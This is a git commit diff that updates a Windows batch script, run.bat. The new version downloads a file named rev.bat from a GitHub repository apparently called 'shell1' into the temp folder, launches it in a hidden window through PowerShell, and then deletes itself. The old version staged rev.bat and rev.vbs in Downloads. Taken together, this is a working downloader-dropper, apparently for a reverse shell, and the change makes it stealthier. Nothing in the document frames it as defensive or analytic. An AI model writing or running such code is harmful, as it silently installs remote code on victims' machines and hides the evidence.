d3da4c9c2440d83c27a73bda1f2e1c22e136d99d
Omar Samy <osamy7592@gmail.com>
2024-05-07 05:02:00 +0300

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,7 +1,4 @@
 @echo off
-set "downloads_dir=%USERPROFILE%\Downloads"
-curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/rev.bat -o "%downloads_dir%\rev.bat"
-curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/rev.vbs -o "%downloads_dir%\rev.vbs"
-call "%downloads_dir%\rev.vbs"
+curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/rev.bat -o "%temp%\rev.bat"
+powershell -c "Start-Process -FilePath "%temp%\rev.bat" -WindowStyle Hidden"
 del "%~f0"
-
